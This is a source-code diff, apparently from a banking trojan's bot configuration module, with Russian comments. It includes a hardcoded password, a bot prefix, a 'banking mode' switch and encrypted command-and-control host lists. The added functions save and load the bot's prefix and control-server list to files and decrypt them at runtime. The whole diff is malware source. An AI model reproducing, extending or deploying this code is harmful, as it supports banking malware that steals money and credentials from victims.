@@ -9,6 +9,7 @@
 #include "Crypt.h"
 #include "BotHosts.h"
 #include "BotClasses.h"
+#include "BotCore.h"
 
 
 #include "Modules.h"
@@ -94,7 +95,7 @@ namespace CONFIGDEBUGSTRINGS
 	PCHAR MainPassword    = "bRS8yYQ0APq9xfzC";
 
 
-	char BOT_PREFIX[]     = "aaawddxxwwst";
+	char BOT_PREFIX[]     = "videorectest";
 	PCHAR DebugDelay      = "1";
 
 #endif
@@ -208,10 +209,9 @@ bool IsBankingMode()
 //-----------------------------------------------------------------------------
 
 
-char *GetPrefix(bool CheckBankingMode)
+string GetPrefix(bool CheckBankingMode)
 {
 	// Функция возвращает префикс бота
-
 
 	#ifdef USE_BANKING_PREFIX
 		// Если включен режим банкинг возвращаем
@@ -220,10 +220,15 @@ char *GetPrefix(bool CheckBankingMode)
 			return BOT_PREFIX_BANK;
 	#endif
 
-	if (BOTPARAM_ENCRYPTED_PREFIX)
-		return Decrypt(BOT_PREFIX);
-	else
-		return BOT_PREFIX;
+	string Prefix = LoadPrefixFromFile(Bot->PrefixFileName().t_str());
+	if (Prefix.IsEmpty())
+	{
+		Prefix = BOT_PREFIX;
+		if (BOTPARAM_ENCRYPTED_PREFIX)
+			Decrypt(Prefix.t_str(), Prefix.t_str());
+    }
+
+    return Prefix;
 }
 
 
@@ -421,12 +426,12 @@ bool IsMainHost(const char* Host)
 
 	/* TODO : Сделать проверку  в файле и проверку в режиме BANKING */
 
-	TStrEnum E(BOT_MAINHOSTS_ARRAY, BOTPARAM_ENCRYPTED_MAINHOSTS, 0);
+	TStrEnum E(BOT_MAINHOSTS_ARRAY, BOTPARAM_ENCRYPTED_MAINHOSTS, BOTPARAM_HASH_MAINHOSTS);
 	while (E.Next())
 	{
 		if (E.Line() == Host)
 			return true;
-    }
+	}
 	return false;
 }
 //-----------------------------------------------------------------------------
@@ -501,8 +506,67 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 
 	return Result;
 }
-
 //-----------------------------------------------------------------------------
+
+//------------------------------------------------------------------
+//  SaveHostsToFile - Функция записывает носты в файл
+//------------------------------------------------------------------
+void SaveHostsToFile(const char* FileName)
+{
+	if (STRA::IsEmpty(FileName))
+		return;
+
+	bool Added = false;
+	PHostList List = Hosts::CreateList();
+
+	TStrEnum E(BOT_MAINHOSTS_ARRAY, BOTPARAM_ENCRYPTED_MAINHOSTS, BOTPARAM_HASH_MAINHOSTS);
+	while (E.Next())
+	{
+		Hosts::AddHost(List, E.Line());
+		Added = true;
+	}
+
+	if (Added)
+		Hosts::SaveListToFile(List, (PCHAR)FileName, true);
+
+    Hosts::FreeList(List);
+}
+//-----------------------------------------------------------------------------
+
+
+//------------------------------------------------------------------
+//  SavePrefixToFile - Функция записывает префикс в файл
+//------------------------------------------------------------------
+void SavePrefixToFile(const char* FileName)
+{
+	if (STRA::IsEmpty(FileName))
+		return;
+
+	string Prefix = BOT_PREFIX;
+	if (!BOTPARAM_ENCRYPTED_PREFIX)
+	{
+		// При необходимости, шифруем префикс
+		Decrypt(Prefix.t_str(), Prefix.t_str());
+    }
+	File::WriteBufferA((PCHAR)FileName, Prefix.t_str(), Prefix.Length());
+}
+//-----------------------------------------------------------------------------
+
+
+//------------------------------------------------------------------
+//  LoadPrefixFromFile - Функция загружает префикс из файла
+//------------------------------------------------------------------
+string LoadPrefixFromFile(const char* FileName)
+{
+	TBotFileStream File(FileName, fcmRead);
+	string Prefix = File.ReadToString();
+	if (!Prefix.IsEmpty())
+    	Decrypt(Prefix.t_str(), Prefix.t_str());
+
+	return Prefix;
+}
+//-----------------------------------------------------------------------------
+
 
 PCHAR GetBotScriptURL(DWORD Script, PCHAR Path, bool CheckBankingMode)
 {
